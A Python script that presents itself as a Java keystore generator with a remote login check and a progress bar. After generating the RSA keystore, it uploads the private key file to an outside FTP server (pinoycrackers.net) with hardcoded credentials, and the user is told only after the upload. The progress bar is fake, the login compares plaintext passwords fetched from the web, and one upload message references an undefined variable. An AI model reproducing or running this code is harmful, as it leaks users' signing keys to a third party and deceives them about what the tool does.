import subprocess
import requests
import getpass
import time
import os
from tqdm import tqdm
from ftplib import FTP

def display_banner():
    banner = """
   _____                       __ __      __      __ 
  / ___/__  ______  ___  _____/ //_/_  __/ /___  / /_
  \__ \/ / / / __ \/ _ \/ ___/ ,< / / / / / __ \/ __/
 ___/ / /_/ / /_/ /  __/ /  / /| / /_/ / / /_/ / /_  
/____/\__,_/ .___/\___/_/  /_/ |_\__,_/_/\____/\__/  
          /_/                                        
    """
    print(banner)

def fetch_user_data(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Failed to fetch user data: {e}")
        return None

def login(users):
    username = input("Enter username: ")
    password = getpass.getpass("Enter password: ")

    for user in users:
        if user['username'] == username and user['password'] == password:
            return True

    print("Invalid username or password.")
    return False

def generate_keystore():
    keystore_name = input("Enter keystore name (e.g., mykeystore.jks): ")
    keystore_password = getpass.getpass("Enter keystore password: ")
    alias_name = input("Enter alias name: ")
    alias_password = getpass.getpass("Enter alias password: ")
    common_name = input("Enter common name (e.g., example): ")
    organization = input("Enter organization name: ")
    organizational_unit = input("Enter organizational unit: ")
    country_code = input("Enter country code (e.g., PH): ")
    validity_years = int(input("Enter validity years (e.g., 100): "))
    key_size = 8192  # Fixed key size as per your requirement

    try:
        # Define the distinguished name fields
        dname = f"CN={common_name}, O={organization}, OU={organizational_unit}, C={country_code}"

        print("Generating keystore, please wait...")

        # Simulate progress bar
        for i in tqdm(range(100), desc="Progress", unit="%"):
            time.sleep(0.05)  # Adjust the sleep time as needed to simulate progress

        # Create the keystore using keytool
        command = [
            'keytool',
            '-genkeypair',
            '-alias', alias_name,
            '-keyalg', 'RSA',
            '-keysize', str(key_size),
            '-validity', str(validity_years * 365),  # Convert years to days
            '-keystore', keystore_name,
            '-storepass', keystore_password,
            '-keypass', alias_password,
            '-dname', dname
        ]

        subprocess.run(command, check=True)
        print(f"Keystore {keystore_name} created successfully.")

        # Upload the keystore file via FTP
        upload_to_ftp(keystore_name)

    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

def upload_to_ftp(filename):
    ftp_host = 'ftp.pinoycrackers.net'
    ftp_user = 'SuperKulot@pinoycrackers.net'
    ftp_password = 'SuperKulot'
    ftp_directory = '/Keys'  # FTP directory where the file will be uploaded

    try:
        # Connect to FTP server
        with FTP(ftp_host, ftp_user, ftp_password) as ftp:
            # Change to target directory
            ftp.cwd(ftp_directory)

            # Open the local file and upload it
            with open(filename, 'rb') as file:
                ftp.storbinary(f'STOR {filename}', file)

            print(f"File {filename} uploaded successfully to https://pinoycrackers.net/Keys/{keystore_name}")
    
    except Exception as e:
        print(f"Failed to upload file via FTP: {e}")

# Display banner
display_banner()

# Fetch user data and perform login
user_data_url = 'https://pinoycrackers.net/keystore.json'
users = fetch_user_data(user_data_url)

if users and login(users):
    generate_keystore()
else:
    print("Exiting.")
